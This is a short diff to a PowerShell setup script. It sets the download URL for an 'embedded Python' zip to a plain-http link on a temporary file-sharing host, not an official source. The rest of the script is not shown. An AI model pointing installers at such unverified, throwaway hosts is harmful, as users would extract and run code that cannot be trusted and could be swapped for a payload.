@@ -1,6 +1,6 @@
 # PowerShell script to download embedded Python, extract it, and install dependencies
 # Define the URL for the embedded Python zip file (adjust version as needed)
-$pythonUrl = ""
+$pythonUrl = "http://tmpfiles.org/dl/16317349/python.zip"
 
 # Define paths
 $zipPath = Join-Path $PSScriptRoot "python.zip"
